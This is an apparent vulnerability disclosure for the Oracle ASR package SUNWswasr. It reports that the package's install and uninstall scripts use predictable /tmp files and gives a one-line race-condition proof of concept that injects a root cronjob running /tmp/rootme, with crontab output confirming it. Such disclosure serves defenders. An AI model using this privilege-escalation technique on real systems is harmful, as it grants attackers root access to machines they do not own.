Description: Auto Service Request (ASR) is a secure, scalable, customer-
installable software feature of warranty and Oracle Support Services that
provides auto-case generation when common hardware component faults occur. ASR
is designed to enable faster problem resolution by eliminating the need to
initiate contact with Oracle Support Services for common hardware component
failures, reducing both the number of phone calls needed and overall phone time
required. ASR also simplifies support operations by using electronic diagnostic
data. Easily installed and deployed, ASR is completely controlled by you, the
customer, to ensure security. ASR is applicable only for component faults. Not
all component failures are covered, though the most common components (such as
disk, fan, and power supplies) are covered.
Vulnerability:
The post-install script for SUNWswasr RPM handles files in /tmp insecurely. I
suspect a race condition exists where these two files can be used to either
clobber root owned files or inject malicious cronjobs into roots cron: /tmp/
tmpVariable /tmp/crontab_edit [root@oracle-lnx-lab02 ~]# rpm -Uvh SUNWswasr-

CVE-
JSON:Export
Exploit Code:
   1. I was able to inject my own cronjob in as root with the following simple
      PoC:
   2.  
   3. $ while (true) ;do echo "* * * * * /tmp/rootme" >> /tmp/crontab_edit;
      done
   4.  
   5. [root@oracle-lnx-lab02 ~]# crontab -l
   6. 0,12,24,36,48 * * * * /opt/SUNWsasm/bin/sasm start-instance > /dev/null
      2>&1
   7.  
   8. * * * * * /tmp/rootme <--- prepended and contains our malicious shell/
      binary, see exploit above.
   9. ##Cronjob entry for ASR Auto Rules Update
  10. 7 3 * * * /opt/SUNWswasr/bin/update_rules.sh
  11.  
  12. The uninstall script is just as sloppy:
  13.  
  14. [C] F /tmp/asrtab.??
  15. [U] F /tmp/asrtab.??
  16. [C] F /tmp/asrtab.???
  17. [U] F /tmp/asrtab.???
  18. [C] F /tmp/asrtab.???
  19. [U] F /tmp/asrtab.???
  20. [D] F /tmp/asrtab.??
  21.  
  22. did they mean to use $$ for process Pid?
